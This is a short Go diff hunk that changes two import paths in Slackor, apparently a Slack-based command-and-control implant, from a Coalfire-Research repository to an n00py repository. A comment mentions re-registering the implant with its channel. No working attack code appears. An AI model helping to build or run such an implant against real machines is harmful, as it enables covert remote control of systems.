@@ -3,8 +3,8 @@ package common
 import (
 	"fmt"
 
-	"github.com/Coalfire-Research/Slackor/internal/slack"
-	"github.com/Coalfire-Research/Slackor/pkg/command"
+	"github.com/n00py/Slackor/internal/slack"
+	"github.com/n00py/Slackor/pkg/command"
 )
 
 // Revive reregisters the implant with the channel
